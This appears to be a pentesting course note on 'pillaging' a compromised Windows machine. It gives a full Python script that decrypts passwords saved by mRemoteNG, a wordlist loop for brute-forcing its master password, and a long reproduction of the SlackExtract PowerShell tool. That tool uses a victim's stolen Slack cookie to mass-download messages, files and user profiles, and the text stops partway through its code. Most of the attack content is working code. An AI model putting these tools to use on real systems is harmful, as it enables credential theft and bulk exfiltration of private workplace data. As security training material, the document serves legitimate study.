---
title: Pillaging
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
---
# Pillaging

Pillaging is the process of obtaining information from a compromised system.

## Data Sources

Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients


## Installed applications

```cmd-session
dir "C:\Program Files"
```


**Get Installed Programs via PowerShell & Registry Keys**

```powershell-session
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation


$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

Output (example):

```
DisplayName                                                        DisplayVersion  InstallLocation
-----------                                                        --------------  ---------------
DB Browser for SQLite                                              3.12.2          C:\Program Files\DB Browser for SQLite\
Google Chrome                                                      105.0.5195.127  C:\Program 
... SNIP ...

mRemoteNG                                                          1.76.20.24615   C:\Program Files (x86)\mRemoteNG\
Slack (Machine - MSI)                                              4.27.154.0

... SNIP ...
```

We can see the `mRemoteNG` software is installed on the system. 


### mRemoteNG

[mRemoteNG](https://mremoteng.org/) is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. Let's take a look at `mRemoteNG`.

- `mRemoteNG` saves connection info and credentials to a file called `confCons.xml`.
- They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.
- By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

mRemoteNG Configuration File - confCons.xml:

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

This XML document contains a root element called `Connections` with the information about the encryption used for the credentials and the attribute `Protected`, which corresponds to the master password used to encrypt the document.

We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element.

```xml
<?xml version="1.0" encoding="UTF-8"?>

[<mrng:Connections ConfVersion="2.6" Protected="AllGNAWw3JJdXFuMG06ssHKpMbWw7AHXKWZVidfNIu5LNVm2nzroKSKtYYfsK66/itwh95OaYLtEX8NA7xy7IMwr" FullFileEncryption="false" KdfIterations="1000" BlockCipherMode="GCM" EncryptionEngine="AES" Export="false" Name="Connections" xmlns:mrng="http://mremoteng.org">](file:///C:/Users/Peter/AppData/Roaming/mRemoteNG/confCons.xml#)
<Node Name="Grace_Local_Acct" InheritRDGatewayDomain="false" InheritRDGatewayPassword="false" InheritRDGatewayUsername="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayHostname="false" InheritRDGatewayUsageMethod="false" InheritVNCViewOnly="false" InheritVNCSmartSizeMode="false" InheritVNCColors="false" InheritVNCProxyPassword="false" InheritVNCProxyUsername="false" InheritVNCProxyPort="false" InheritVNCProxyIP="false" InheritVNCProxyType="false" InheritVNCAuthMode="false" InheritVNCEncoding="false" InheritVNCCompression="false" InheritExtApp="false" InheritUserField="false" InheritMacAddress="false" InheritPostExtApp="false" InheritPreExtApp="false" InheritLoadBalanceInfo="false" InheritRDPAlertIdleTimeout="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAuthenticationLevel="false" InheritICAEncryptionStrength="false" InheritUsername="false" InheritRenderingEngine="false" InheritUseCredSsp="false" InheritUseConsoleSession="false" InheritAutomaticResize="false" InheritResolution="false" InheritSoundQuality="false" InheritRedirectSound="false" InheritRedirectSmartCards="false" InheritRedirectPrinters="false" InheritRedirectPorts="false" InheritRedirectKeys="false" InheritRedirectDiskDrives="false" InheritPuttySession="false" InheritProtocol="false" InheritPort="false" InheritPassword="false" InheritPanel="false" InheritIcon="false" InheritDomain="false" InheritEnableDesktopComposition="false" InheritEnableFontSmoothing="false" InheritDisplayWallpaper="false" InheritDisplayThemes="false" InheritDescription="false" InheritColors="false" InheritCacheBitmaps="false" RDGatewayDomain="" RDGatewayPassword="" RDGatewayUsername="" RDGatewayUseConnectionCredentials="Yes" RDGatewayHostname="" RDGatewayUsageMethod="Never" VNCViewOnly="false" VNCSmartSizeMode="SmartSAspect" VNCColors="ColNormal" VNCProxyPassword="" VNCProxyUsername="" VNCProxyPort="0" VNCProxyIP="" VNCProxyType="ProxyNone" VNCAuthMode="AuthVNC" VNCEncoding="EncHextile" VNCCompression="CompNone" ExtApp="" UserField="" MacAddress="" PostExtApp="" PreExtApp="" Connected="false" RedirectKeys="false" SoundQuality="Dynamic" RedirectSound="DoNotPlay" RedirectSmartCards="false" RedirectPrinters="false" RedirectPorts="false" RedirectDiskDrives="false" CacheBitmaps="false" EnableDesktopComposition="false" EnableFontSmoothing="false" DisplayThemes="false" DisplayWallpaper="false" AutomaticResize="true" Resolution="FitToWindow" Colors="Colors16Bit" LoadBalanceInfo="" RDPAlertIdleTimeout="false" RDPMinutesToIdleTimeout="0" RDPAuthenticationLevel="NoAuth" ICAEncryptionStrength="EncrBasic" RenderingEngine="IE" UseCredSsp="true" ConnectToConsole="false" Port="3389" PuttySession="Default Settings" Protocol="RDP" Hostname="localhost" Password="s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" Domain="PILLAGING-WIN01" Username="grace" Id="88291c0c-b6b0-4f2d-b180-81d3b50485a4" Panel="General" Icon="mRemoteNG" Descr="Grace Account" Type="Connection"/></mrng:Connections>
```


We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.

We will use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password:

```python
#!/usr/bin/env python3

import hashlib
import base64
from Cryptodome.Cipher import AES
import argparse
import sys

def main():
  parser = argparse.ArgumentParser(description="Decrypt mRemoteNG passwords.")
  group = parser.add_mutually_exclusive_group()
  group.add_argument("-f", "--file", help="name of file containing mRemoteNG password")
  group.add_argument("-s", "--string", help="base64 string of mRemoteNG password")
  parser.add_argument("-p", "--password", help="Custom password", default="mR3m")

  if len(sys.argv) < 2:
    parser.print_help(sys.stderr)
    sys.exit(1)

  args = parser.parse_args()
  encrypted_data = ""
  if args.file != None:
    with open(args.file) as f:
      encrypted_data = f.read()
      encrypted_data = encrypted_data.strip()
      encrypted_data = base64.b64decode(encrypted_data)

  elif args.string != None:
    encrypted_data = args.string
    encrypted_data = base64.b64decode(encrypted_data)

  else:
    print("Please use either the file (-f, --file) or string (-s, --string) flag")
    sys.exit(1)

  salt = encrypted_data[:16]
  associated_data = encrypted_data[:16]
  nonce = encrypted_data[16:32]
  ciphertext = encrypted_data[32:-16]
  tag = encrypted_data[-16:]
  key = hashlib.pbkdf2_hmac("sha1", args.password.encode(), salt, 1000, dklen=32)

  cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
  cipher.update(associated_data)
  plaintext = cipher.decrypt_and_verify(ciphertext, tag)
  print("Password: {}".format(plaintext.decode("utf-8")))

if __name__ == "__main__":
  main()
```

We will clone it:

```
https://github.com/haseebT/mremoteng-decrypt-1.git

cd mremoteng-decrypt
```

```bash
# Access our environment:
activate tooling

# Save the credentials to a file 
echo "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" > file.txt
```

And run the script:

```
python3 mremoteng_decrypt.py -f file.txt
```

Output: 

```
Password: Princess01!

```


Also, we might run into an error such as:

```
Traceback (most recent call last):
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 49, in <module>
    main()
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 45, in main
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 567, in decrypt_and_verify
    self.verify(received_mac_tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 508, in verify
    raise ValueError("MAC check failed")
ValueError: MAC check failed
```

If we use the custom password, we can decrypt it.

```shell-session
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
```

In case we want to attempt to crack the password, we can modify the script to try multiple passwords from a file, or we can create a Bash `for loop`. We can attempt to crack the `Protected` attribute or the `Password` itself. If we try to crack the `Protected` attribute once we find the correct password, the result will be `Password: ThisIsProtected`. If we try to crack the `Password` directly, the result will be `Password: <PASSWORD>`.

```shell
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
```


## Abusing Cookies to Get Access to IM Clients

With the ability to instantaneously send messages between co-workers and teams, instant messaging (IM) applications like `Slack` and `Microsoft Teams` have become staples of modern office communications.

### Slack

**Resources**:

- https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282
- https://thomfre.dev/post/2021/phishing-for-slack-tokens/



**Tools**:
-  [SlackExtract](https://github.com/clr2of8/SlackExtract) 
- [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py)
- [SharpChromium](https://github.com/djhohnstein/SharpChromium)

#### SlackExtract

This would be SlackExtract.ps1

```powershell
function Invoke-SlackExtract{
 <#
    .SYNOPSIS
    This module will extract all messages and files that a given user has access to in Slack
    Author: Carrie Roberts (@OrOneEqualsOne)
    Version: 1.1
    License: BSD 3-Clause

    .DESCRIPTION
    This module will extract all messages and files that a given user has access to in Slack. Or, optionally specifiy specific channels to download from.

    .PARAMETER OutputFolderName
    [Required] The output folder name to store all messages and files inside of the "My Documents" folder. This is useful for keeping data from multiple users separate, or to keep output from multiple runs of the script separate.

    .PARAMETER SlackUrl
    [Required] The base URL of the slack instance. For example "https://slackextract.slack.com"

    .PARAMETER dCookie
    [Required if SlackToken not specified] The "d" cookie from .slack.com. Login to Slack as your victim user and then extract this cookie value for use with this script.

    .PARAMETER ChannelIds
    [Optional] The Channel IDs that you want to extract messages and files for. Channel IDs generally start with a "C","G" or "D". If you do not specify ChannelIds, the script will download messages and files from ALL channels. You can determine the channel ID by inspecting the URL in the browser (e.g. https://slackextract.slack.com/messages/CC74THDHB/ would have  a channel ID of CC74THDHB) 

    .PARAMETER ExcludeChannelIds
    [Optional] A list of Channel IDs that you do not want to extract messages or files for.

    .PARAMETER MaxMessagesPerChannel
    [Optional] The maximum number of messages to download from each channel. The default is 10,000 and the minimum is 200. It is a good idea to use a reasonable limit because automated bot channels can have an insane amount of uninteresting messages.

    .PARAMETER MaxFilesPerChannel
    [Optional] The maximum number of files to download from each channel. The default is 2,000.

    .PARAMETER ExtractUsers
    [Optional] A command line switch to specify that the script should extract up to MaxUsers user profiles and then exit. No messages or files will be downloaded while this switch is being used. 

    .PARAMETER MaxUsers
    [Optional] The maximum number of user profiles to download. This is useful for extracting usernames, email, job tiles, phone numbers, etc. The default is 100,000. The -ExtractUsers parameter must be specified to download users.

    .PARAMETER PrivateOnly
    [Optional] A command line switch to ignore all public channels (i.e. don't download messages and files for public channels)

    .PARAMETER SlackToken
    [Required if dCookie not Specifed] Manually set the Slack token value instead of fetching it from slack using the dCookie. This will speed up subsequent runs of the script against the same workspace. Slack tokens start with "xoxs-". The token will be printed to the screen when this parameter is not specified.
    
    .PARAMETER OutputDir
    [Optional] The file location to write script output too. The OutputFolderName will be appended to this parameter. The default OutputDir is the "My Documents" directory on Windows.

    .PARAMETER ExtractAccessLogs
    [Optional] A command line switch to specify that the script should extract up to MaxAccessLogs and then exit. No messages or files will be downloaded while this switch is being used. This only works for paid slack workspaces. You also must have access to Slack as an admin for this to work.

    .PARAMETER MaxAccessLogs
    [Optional] The maximum number of user access logs to download. The default is 100,000. The -ExtractAccessLogs parameter must be specified to download users.
   
    .PARAMETER NoReplies
    [Optional] A command line switch to ignore replies to messages (i.e. don't download replies to messages). A separate web request must be made for each message with replies, so enabling this flag reduces the execution time of the script, at the expense of not fetching replies.

    .PARAMETER ForceRedownload
    [Optional] A command line switch to force the redownloading of content. No existing content will be deleted, but it may be overwritten with a more recent version (e.g: an updated message).

    .EXAMPLE
    
    C:\PS> Invoke-SlackExtract -SlackUrl https://slackextract.slack.com -OutputFolderName Carrie -dCookie On3pAK1fxrp%2BGrDENnmgdvEg5JwDgf%2BNclR5d2NUY0w1R01EYHFvaVdOUGV2OExDVWdZbGxnVUyFUVl0enFZd0VjTUZIeExabWZFYkJUTDVBWnlRRU84WEQ3YjRyVWUzVnFIOGlFUUhvS3B6ZVZnY1l3Q2xqTEhRSUhRNXhXaFVyaisrc3A5YWNrbWpmaWpVUGt0eTV0YzZsaWYxaVd0L1NKSWQyQ0k9JAizLCi3UrA%2BeYL6uU%2B8Zg%3D%3D

    Description
    -----------
    This command will download up to 2,000 files and up to 10,000 messages from each and every channel the user has access to. 
    The output will be written to the "My Documents" directory in the "SlackExtract\Carrie\" folder
    
    .EXAMPLE
    C:\PS> Invoke-SlackExtract -MaxMessagesPerChannel 200 -MaxFilesPerChannel 50 -ChannelIds C1JLE30R3,GB9TMN61M,DB04V15N0 -SlackUrl https://slackextract.slack.com -OutputFolderName Carrie -dCookie On3pAK1fxrp%2BGrDENnmgdvEg5JwDgf%2BNclR5d2NUY0w1R01EYHFvaVdOUGV2OExDVWdZbGxnVUyFUVl0enFZd0VjTUZIeExabWZFYkJUTDVBWnlRRU84WEQ3YjRyVWUzVnFIOGlFUUhvS3B6ZVZnY1l3Q2xqTEhRSUhRNXhXaFVyaisrc3A5YWNrbWpmaWpVUGt0eTV0YzZsaWYxaVd0L1NKSWQyQ0k9JAizLCi3UrA%2BeYL6uU%2B8Zg%3D%3D

    Description
    -----------
    This command will download up to files 50 and up to 200 messages from only the three Channels specified.
    
    .EXAMPLE
    
    C:\PS> Invoke-SlackExtract -ExtractUsers -SlackUrl https://slackextract.slack.com -OutputFolderName Carrie -dCookie On3pAK1fxrp%2BGrDENnmgdvEg5JwDgf%2BNclR5d2NUY0w1R01EYHFvaVdOUGV2OExDVWdZbGxnVUyFUVl0enFZd0VjTUZIeExabWZFYkJUTDVBWnlRRU84WEQ3YjRyVWUzVnFIOGlFUUhvS3B6ZVZnY1l3Q2xqTEhRSUhRNXhXaFVyaisrc3A5YWNrbWpmaWpVUGt0eTV0YzZsaWYxaVd0L1NKSWQyQ0k9JAizLCi3UrA%2BeYL6uU%2B8Zg%3D%3D

    Description
    -----------
    This command will download up to 100,000 user profiles and then exit. No channel messages or files will be downloaded. 
    You can limit the number of profiles downloaded with the MaxUsers parameter.
    
#>

 Param(

     [Parameter(Mandatory = $true)]
     [string]
     $OutputFolderName,

     [Parameter(Mandatory = $true)]
     [string]
     $SlackUrl,

     [Parameter( Mandatory = $false)]
     [string[]]
     $ChannelIds,

     [Parameter( Mandatory = $false)]
     [string[]]
     $ExcludeChannelIds,

     [Parameter(Mandatory = $false)]
     [ValidateRange(200,1000000)]
     [Int]
     $MaxMessagesPerChannel = 10000, #Default is 10,000 messages per channel, Minimum is 200 messages per channel

     [Parameter(Mandatory,ParameterSetName='dCookie')]
     [string]
     $dCookie,

     [Parameter(Mandatory = $false)]
     [Int]
     $MaxFilesPerChannel = 2000, #Default is 2,000 files per channel

     [Parameter(Mandatory = $false)]
     [ValidateRange(200,1000000)]
     [Int]
     $MaxUsers = 100000, #Default is 100,000 user profiles to download, Minimum is 200 users

     [Parameter(Mandatory = $false)]
     [Switch]
     $ExtractUsers = $false,

     [Parameter(Mandatory = $false)]
     [Switch]
     $PrivateOnly = $false,

     [Parameter(Mandatory,ParameterSetName='token')]
     [String]
     $SlackToken,
     
     [Parameter(Mandatory = $false)]
     [String]
     $OutputDir,

     [Parameter(Mandatory = $false)]
     [ValidateRange(200,1000000)]
     [Int]
     $MaxAccessLogs = 100000, #Default is 100,000 access logs to download, Minimum is 200 login events

     [Parameter(Mandatory = $false)]
     [Switch]
     $ExtractAccessLogs = $false,

     [Parameter(Mandatory = $false)]
     [Switch]
     $NoReplies = $false,

     [Parameter(Mandatory = $false)]
     [Switch]
     $ForceRedownload = $false
 )

(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 
Add-Type -AssemblyName System.Web

$ua = "Mozilla"

$docsDir = [Environment]::GetFolderPath("MyDocuments")
if(-not $outputDir) {$outputDir = Join-Path -Path $docsDir -ChildPath "SlackExtract" | Join-Path -ChildPath $OutputFolderName }
else { $outputDir = Join-Path -Path $outputDir -ChildPath "SlackExtract" | Join-Path -ChildPath $OutputFolderName }
Write-Host -ForegroundColor Green "All output will be written to the $outputDir directory`n" 
$delay = 1 # a delay after every request to slack to avoid rate limiting
$timer = [System.Diagnostics.Stopwatch]::StartNew()

function CreateDirIfNotExists( $dir ){
    if(!(test-path $dir)){ $r = New-Item -ItemType Directory -Path $dir }
}

# create a "meta" folder and subfolder for each channel type
$metaDir = Join-Path -Path $OutputDir -ChildPath "meta"; CreateDirIfNotExists($metaDir)
$channelsMetaDir = Join-Path -Path $metaDir -ChildPath "channels_meta"; CreateDirIfNotExists($channelsMetaDir)
$groupsMetaDir = Join-Path -Path $metaDir -ChildPath "groups_meta"; CreateDirIfNotExists($groupsMetaDir)
$imsMetaDir = Join-Path -Path $metaDir -ChildPath "ims_meta"; CreateDirIfNotExists($imsMetaDir)
$mpimsMetaDir = Join-Path -Path $metaDir -ChildPath "mpims_meta"; CreateDirIfNotExists($mpimsMetaDir)
$usersDir = Join-Path -Path $metaDir -ChildPath "users"; CreateDirIfNotExists($usersDir)
$accessLogsDir = Join-Path -Path $metaDir -ChildPath "access_logs"; CreateDirIfNotExists($accessLogsDir)

#Shazam calls an endpoint for 200 results at a time and keeps making calls until there are no more results or until $limit is reached.
function Shazam($apiEndpoint, $requestBody, $type, $limit, $folder){
    $messagesCount = 0
	do {
		$gotOK = $false
		$autoRetries = 5
		$count = 0
		$exception = $false
        $followCursor = $false
		
        while (!$gotOK)
		{
    	    try
            {

                $responseConversationsHistory = Invoke-RestMethod -Uri "$SlackUrl/api/$apiEndpoint" -Method Post -Body $requestBody -UserAgent $ua -TimeoutSec 600; sleep($delay) 

				$exception = $false
			}
			catch [System.Exception]
			{
				$exception = $true
			}

			if($exception -or !($responseConversationsHistory.ok)) {
                Write-Host -ForegroundColor Red "Problem $apiEndpoint $type : $($responseConversationsHistory.error)"
                foreach($e in $responseConversationsHistory) {
				    Write-Host -ForegroundColor Red $e 
                }
				if($count -lt $autoRetries) {
					$sleepTime = 10
					Write-Host -ForegroundColor Yellow  "Auto-Retrying in $($sleepTime * $count) seconds"
					sleep($sleepTime * $count)

				}
				else{ Read-Host -Prompt "Press Enter to continue"}
			} 
			else {$gotOK = $true}
			$count = $count + 1
		}
        $collection = $responseConversationsHistory.messages

        if($type -eq "user"){ 
            $collection = $responseConversationsHistory.members 
        }
        elseif($type -eq "login"){ 
            $collection = $responseConversationsHistory.logins 
        }
        elseif($type -ne "message"){ 
            if($responseConversationsHistory.channels){
                $collection = $responseConversationsHistory.channels 
            }
            else {
                $collection = $responseConversationsHistory.channel
            }
        }
		foreach ($message in $collection)
		{
			$messagesCount = $messagesCount + 1
            $name=$message.id 
            if($type -eq "login"){ $name = "$($message.date_last)-$($message.user_id)" }
            elseif($type -eq "message"){ $name = $message.ts}
			# only redownload if the file doesn't exist already
			# or if the script is overwriting files and this message is not tha parent message in a thread through the conversation.replies API
			# since the parent message through the replies API contains less metadata than the original message through the conversation.history API
			$isParentMessageInReplyThread = $apiEndpoint -eq "conversations.replies" -and $message.reply_count
			$fn = Join-Path -Path $folder -ChildPath "$name.json"
			if(!(test-path $fn) -or ($ForceRedownload -and !($isParentMessageInReply))){
				$message | ConvertTo-Json | Out-File $fn
				if ($type -eq "user") {
					# download user profile pictures
					$session = getSession
					$profileImageTypes = "original", "1024", "512", "192", "72", "48", "32", "24"
					foreach ($imageType in $profileImageTypes) {
						if ($message.profile."image_$imageType") {
							$imagePath = Join-Path -Path $folder -ChildPath "$($name)_image_$($imageType).png"
							Invoke-WebRequest -Uri $message.profile."image_$imageType" -WebSession $session -UserAgent $ua -OutFile $imagePath
							break
						}
					}
				}
			}
			else {
				if($type -ne "message"){Write-Host -ForegroundColor Yellow "Skipping already existing file: $fn"}
			}
			if($apiEndpoint -eq "conversations.history" -and $message.reply_count -and !($NoReplies)) {
				$body = @{token=$SlackToken; channel = $requestBody.channel; ts=$message.ts; limit=200}
				$repliesCount = Shazam "conversations.replies" $body "message" $maxMessagesPerChannel $messagesDir
				Write-Host -ForegroundColor Cyan "Done getting $repliesCount replies for message $name"
			}
		}
        if($responseConversationsHistory.response_metadata -and $responseConversationsHistory.response_metadata.next_cursor){
            $followCursor = $true
            $requestBody.remove("cursor")
		    $requestBody.Add("cursor",$responseConversationsHistory.response_metadata.next_cursor) 
        }
        elseif($responseConversationsHistory.paging -and ($responseConversationsHistory.paging.page -lt $responseConversationsHistory.paging.pages)){
            $followCursor = $true
            $requestBody.remove("page")
		    $requestBody.Add("page",$responseConversationsHistory.paging.page + 1) 
        }
	} while ($followCursor -and ($messagesCount -lt $limit ))

    return $messagesCount
}


function getChannelsMeta($type)
{
    Write-Host -ForegroundColor Cyan "Getting $type`s meta data"
    $cDir = $channelsMetaDir
    if($type -eq "private_channel") { $cDir = $groupsMetaDir }
    if($type -eq "im") {  $cDir = $imsMetaDir }
    if($type -eq "mpim") { $cDir = $mpimsMetaDir }

    # If specific channel IDs were specified, only download those channel details
    if($ChannelIds) { 
		foreach ($channel in $ChannelIds){
            $requestBody = @{token=$SlackToken; channel=$channel}
            $messagesCount = Shazam "conversations.info" $requestBody $type 100000000 $cDir
		}
    }
    else { # Don't download all the channels if specific group or channel IDs were specified
        $requestBody = @{token=$SlackToken; exclude_members='true'; types=$type; limit=200}
        $messagesCount = Shazam "conversations.list" $requestBody $type 100000000 $cDir
    }
}

function metaToCSV ($dir, $users = $false)
{
	Write-Host -ForegroundColor Cyan "Converting metadata to CSV for easy viewing in Excel, look here:`n$dir"
    $name="all_channels.csv"; if($users) { $name = "all_users.csv" }
    $channels = New-Object System.Collections.ArrayList
	foreach($file in (Get-ChildItem $dir -Filter *.json).fullname)
	{
		$channel = (gc $file -Raw | ConvertFrom-Json)
        if($users){
		    $id = $channels.add($channel.profile) 
        }
        else {
		    $id = $channels.add($channel) 
        }
	}
	$channels | ConvertTo-CSV -NoTypeInformation -Delimiter `t | Out-File (Join-Path -Path $dir -ChildPath $name)
}

function getFilesMetaForChannels($channelsOrGroupsMetaDir) 
{
    foreach($channelFile in (Get-ChildItem $channelsOrGroupsMetaDir -Filter *.json).fullname)
	{
        $count = 0
        $limit = 200
        $quit = $false
        if($MaxFilesPerChannel -lt $limit) { $limit = $MaxFilesPerChannel }
		$channel = (gc $channelFile -Raw | ConvertFrom-Json)
		 
        if($ExcludeChannelIds -contains $channel.id){ continue }
	
	    $bodyFilesList = @{token=$SlackToken; count=$limit; channel=$channel.id} 
	    do {
            $filesList = Invoke-RestMethod -Uri "$SlackUrl/api/files.list" -Method Post -Body $bodyFilesList -UserAgent $ua; sleep($delay)


		    Foreach ($file in $filesList.files)
		    {
			    # write the file details as a json message to the filesDir
			    $file | ConvertTo-Json | Out-File (Join-Path -Path $outputDir -ChildPath $channel.id | Join-Path -ChildPath "files" | Join-Path -ChildPath "meta" | Join-Path -ChildPath "$($file.timestamp)-$($file.id).json")
                $count = $count + 1
                if($count -ge $MaxFilesPerChannel) { $quit = $true; break } 
		    } 
		    $bodyFilesList = @{token=$SlackToken; count=$limit; channel=$channel.id; page=$filesList.paging.page+1}
	    } while ((-not $quit) -and ($filesList.paging.page+1 -le $filesList.paging.pages))
    }
}

function getFilesMeta {
    if(-Not $PrivateOnly){
        Write-Host -ForegroundColor Cyan "Getting files metadata for public channels"
        getFilesMetaForChannels($channelsMetaDir)
    }
    Write-Host -ForegroundColor Cyan "Getting files metadata for private channels"
    getFilesMetaForChannels($groupsMetaDir)
    Write-Host -ForegroundColor Cyan "Getting files metadata for IMs"
    getFilesMetaForChannels($imsMetaDir)
    Write-Host -ForegroundColor Cyan "Getting files metadata for Multi-Party IMs"
    getFilesMetaForChannels($mpimsMetaDir)
}

function getMessages($dir)
{
    Write-Host -ForegroundColor Cyan "Getting Messages for each channel (max messages per channel: $maxMessagesPerChannel), $dir"
	
	foreach($groupFile in (Get-ChildItem $dir -Filter *.json).fullname)
	{

		$group = (gc $groupFile -Raw | ConvertFrom-Json)
		$skip = $false
        if($ExcludeChannelIds -contains $group.id){ continue }
        $donePath = Join-Path $dir -ChildPath "done_getting_messages_for.txt"
        if(!($ForceRedownload) -and (Test-Path $donePath))
        {
		    foreach($dg in (gc $donePath)) # temporary short circuit because we already have this channel done
		    {
			    if(($group.id -eq $dg)) {$skip = $true; Write-Host -ForegroundColor Yellow "Skipping message download for $($group.id). Remove this file to force re-download: $donePath"; continue} 
		    }
        }
		if($skip){continue}

		Write-Host -ForegroundColor Cyan "Getting messages for $($group.id)"
		# create output folder for each channel with a "files" and "messages" folder inside
		$channelDir = Join-Path -Path $OutputDir -ChildPath $group.id; CreateDirIfNotExists($channelDir)
		$filesDir = Join-Path -Path $channelDir -ChildPath "files"; CreateDirIfNotExists($filesDir)
		$filesMetaDir = Join-Path -Path $filesDir -ChildPath "meta"; CreateDirIfNotExists($filesMetaDir)
		$messagesDir = Join-Path -Path $channelDir -ChildPath "messages"; CreateDirIfNotExists($messagesDir)

		# get all the messages
        $body = @{token=$SlackToken; channel = $group.id; limit=200} 
        $messagesCount = Shazam "conversations.history" $body "message" $maxMessagesPerChannel $messagesDir

		Write-Host -ForegroundColor Cyan "Done getting messages for $($group.id), total messages $messagesCount"
		Add-Content (Join-Path $dir -ChildPath "done_getting_messages_for.txt") "$($group.id)"
    }
}

function getUsers{
    Write-Host -ForegroundColor Cyan "Getting all user details, see $usersDir"
    $body = @{token=$SlackToken; limit=200} 
    $messagesCount = Shazam "users.list" $body "user" $MaxUsers $usersDir
}

function getAccessLogs{
    $body = @{token=$SlackToken; count=200} 
    $messagesCount = Shazam "team.accessLogs" $body "login" $MaxAccessLogs $accessLogsDir
}

function getFilesforChannelOrGroup($channelOrGroupDir){
	foreach($channelFile in (Get-ChildItem $channelOrGroupDir -Filter *.json).fullname)
	{
        $filesCount = 0
		$channel = (gc $channelFile -Raw | ConvertFrom-Json)
        $dirMinusMeta = Join-Path -Path $outputDir -ChildPath $channel.id | Join-Path -ChildPath "files" 
        $dir = Join-Path -Path $dirMinusMeta -ChildPath "meta"
        if(!(test-path $dir)) { continue }
    	foreach($fileF in (Get-ChildItem $dir -Filter *.json).fullname)
		{
			$file = (gc $fileF -Raw | ConvertFrom-Json)


			$fileUrl = $file.url_private_download

			# adding a fix here for "special" files like linked google docs
			# which Slack treats as a file but cannot be downloaded
			if (! $fileUrl ) {
				Write-Host "Skipping file $($file.id), as it has no downloadable URL"
				continue
			}

			$fileName = Join-Path -Path $dirMinusMeta -ChildPath $($file.id + "_" + $fileUrl.Substring($fileUrl.LastIndexOf("/") + 1))
			if(test-path $fileName){ Write-Host "Skipping already existing file $fileName"}
			else
			{
				Write-Host "Downloading $fileName"

				$response = Invoke-WebRequest -Uri $fileUrl -Headers $headers -UserAgent $ua -OutFile $fileName

			}
            $filesCount = $filesCount + 1
            if ($filesCount -ge $MaxFilesPerChannel) {  Write-Host -ForegroundColor Yellow "Short circuiting file download, $MaxFilesPerChannel files downloaded. Increase MaxFilesPerChannel parameter to download more files";  break }
		} 
    }
}

function getSession{

    #Manually set the session cookie
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $cookie = New-Object System.Net.Cookie 
    $cookie.Name = "d"
    $cookie.Value = $dCookie
    $cookie.Domain = ".slack.com"
    $session.Cookies.Add($cookie);

    $session
}

function getFiles
{

    if(-Not $PrivateOnly){
        Write-Host -ForegroundColor Cyan "Getting files for each public channel"
        getFilesforChannelOrGroup($channelsMetaDir)
    }

    Write-Host -ForegroundColor Cyan "Getting files for each private channel"
